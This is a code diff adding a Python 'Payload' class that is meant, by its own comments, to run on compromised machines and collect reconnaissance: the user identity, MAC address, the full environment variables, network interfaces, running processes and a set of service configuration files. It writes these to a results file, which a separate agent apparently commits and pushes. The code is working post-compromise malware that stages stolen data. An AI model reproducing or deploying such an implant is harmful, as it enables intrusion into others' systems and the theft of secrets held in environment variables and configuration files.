@@ -1,0 +1,119 @@
+import sys
+import os
+import json
+from subprocess import Popen, PIPE
+import uuid
+import datetime
+import pwd
+
+class Payload:
+
+    #############################
+    ## Core required functions ##
+    #############################
+
+    def __init__(self):
+        self.results = {}
+
+    # This is the main() method that's called by compromised machines
+    # Gather info/run commands and store the results in self.results
+    def run(self):
+        self.results["username"]    = self.get_username()
+        self.results["whoami"]      = self.get_whoami()
+        self.results["mac_address"] = self.get_mac_address()
+        self.results["env"]         = self.get_env()
+        self.results["ifconfig"]    = self.get_ifconfig()
+        self.results["ps_services"] = self.get_services()
+
+        self.results["node_id"] = self.get_node_id()
+        self.results["python_version"] = self.get_python_version()
+        self.results["service_configs"] = self.get_service_configs()
+        self.results["time_ran"] = self.get_time_ran()
+
+
+    # This is called after run() as the final step in the payload, saving the results
+    # to a file.
+    # - agent.py handles committing and pushing the results.
+    def save_results(self, filename = "results.json"):
+        with open(filename, 'w') as f:
+            json.dump(self.results, f)
+
+
+    #############
+    ## Helpers ##
+    #############
+
+    # Runs the passed string as a shell command
+    def run_command(self, command):
+        print("[*] running: %s" % command)
+        try:
+            proc = Popen(command, stdout=PIPE, stderr=PIPE, shell=True, universal_newlines=True)
+            (out, err) = proc.communicate()
+            return {"stdout": out, "stderr": err}
+        except:
+            return {"stdout": "", "stderr": "Command threw an exception"}
+
+
+    #################################################################
+    # Below are various helper functions to gather environment info #
+    #################################################################
+
+    def get_python_version(self):
+        print("[*] get_python_version")
+        x = sys.version_info
+        return {"major": x.major, "minor": x.minor, "micro": x.micro,
+                "releaselevel": x.releaselevel}
+
+    def get_env(self):
+        return dict(os.environ) # dumping this to JSON fails unless you explicitly cast it to a dict
+
+    def get_username(self):
+        try:
+            # apparently os.getlogin() is known to fail. Good job.
+            # https://stackoverflow.com/questions/3100750/running-command-in-background
+#            return os.getlogin()
+            return pwd.getpwuid(os.geteuid()).pw_name
+        except:
+            return "os.getlogin() failed"
+
+    def get_whoami(self):
+    	return self.run_command("whoami")["stdout"].strip()
+
+    def get_ifconfig(self):
+        return self.run_command("ifconfig")
+
+    #############################################################################
+    #Payloads for Linux Priv Esc tasks                                          #
+    #Credit : https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/#
+    #############################################################################
+
+    # Get running services
+    def get_services(self):
+        return self.run_command("ps aux")
+
+    #Misconfigured Services and vuln plugins
+    def get_service_configs(self):
+        return {
+            "syslog": self.run_command("cat /etc/syslog.conf"),
+            "chttp": self.run_command("cat /etc/chttp.conf"),
+            "lighthttpd": self.run_command("cat /etc/lighttpd.conf"),
+            "cupsd": self.run_command("cat /etc/cups/cupsd.conf"),
+            "inetd": self.run_command("cat /etc/inetd.conf"),
+            "my": self.run_command("cat /etc/my.conf"),
+            "httpd": self.run_command("cat /etc/httpd/conf/httpd.conf"),
+            "httpd_opt": self.run_command("cat /opt/lampp/etc/httpd.conf")
+        }
+
+    # http://stackoverflow.com/questions/159137/getting-mac-address
+    def get_mac_address(self):
+        mac_addr = uuid.getnode()
+        if mac_addr == uuid.getnode(): # apparently sometimes it'll lie, see the stack overflow link
+            return ':'.join(("%012X" % mac_addr)[i:i+2] for i in range(0, 12, 2))
+        else:
+            "maybewrong " + ':'.join(("%012X" % mac_addr)[i:i+2] for i in range(0, 12, 2))
+
+    def get_time_ran(self):
+        return str(datetime.datetime.now())
+
+    def get_node_id(self):
+        return str(uuid.uuid4())
